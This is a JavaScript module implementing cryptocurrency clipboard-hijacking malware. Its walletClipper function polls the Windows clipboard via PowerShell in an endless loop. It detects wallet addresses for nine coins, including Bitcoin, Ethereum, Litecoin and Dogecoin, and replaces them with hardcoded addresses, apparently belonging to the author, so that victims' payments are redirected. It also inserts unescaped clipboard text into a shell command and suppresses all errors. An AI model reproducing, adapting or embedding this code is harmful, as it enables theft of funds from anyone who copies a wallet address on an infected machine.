const child_process = require("child_process")

class BlockChain {
    constructor(adress, regex) {
        this.adress = adress;
        this.regex = regex;
    }
}

function walletClipper() {
    const blockchains = [
        new BlockChain("bc1qp42p30vkch2k27c2shq5v9tnvqxl73xmlfsxzf", new RegExp("^(bc1|[13])[a-zA-HJ-NP-Z0-9]{25,39}$")), // btc
        new BlockChain("LSWmKmiVMKiqujJb5EyCSfZdGLkekUHKR5", new RegExp("(?:^[LM3][a-km-zA-HJ-NP-Z1-9]{26,33}$)")), // ltc
        new BlockChain("GDLCBEGKABWVPLIAEUQHZ27YEJDFD2WK3I5NNY5ZJTSPA2ZWVSUGK7NB", new RegExp("(?:^G[0-9a-zA-Z]{55}$)")), // xlm
        new BlockChain("rPrc9L9jvRP2fy3Ly7b6GB9H6Pv2srv7zw", new RegExp("(?:^r[0-9a-zA-Z]{24,34}$)")), // xrp
        new BlockChain("qperqt4qf5w52mp7uewm3lskvwhlr7kh9gytgq62lg", new RegExp("^((bitcoincash:)?(q|p)[a-z0-9]{41})")), // bch
        new BlockChain("XhxGyB95KGxnWMXpYxbQ4hcjkYM8Gh8W39", new RegExp("(?:^X[1-9A-HJ-NP-Za-km-z]{33}$)")), // dash
        new BlockChain("AXpDcqmvhw5AdBCQ2orUCgsujFu2gsZrnC", new RegExp("(?:^A[0-9a-zA-Z]{33}$)")), // neo
        new BlockChain("DLCaRHRKXp4s8uHtHHZz6dNwVedgbdKNiB", new RegExp("D{1}[5-9A-HJ-NP-U]{1}[1-9A-HJ-NP-Za-km-z]{32}")), // doge
        new BlockChain("0xa008E65A57C4dFB80106639cDDFe46E173744195", new RegExp("(?:^0x[a-fA-F0-9]{40}$)")) // eth
    ];

    while (true) {
        try {
            const paste = child_process.execSync(`powershell Get-Clipboard`).toString("utf8").replace("\r", "");
            let text = paste;
            let dtc = false;

            for (let i = 0; i < blockchains.length; i++) {
                const blockchain = blockchains[i];

                for (let line of text.split("\n")) {
                    if (line == blockchain.adress) {
                        break;
                    }
                    if (blockchain.regex.test(line.replace("\r", ""))) {
                        dtc = true;
                        text = text.replace(line, blockchain.adress);
                    }
                }

                if (dtc) {
                    child_process.execSync(`powershell Set-Clipboard ${text}`);
                }
            }

        } catch (e) { };
    }
};

module.exports = {
    walletClipper
}
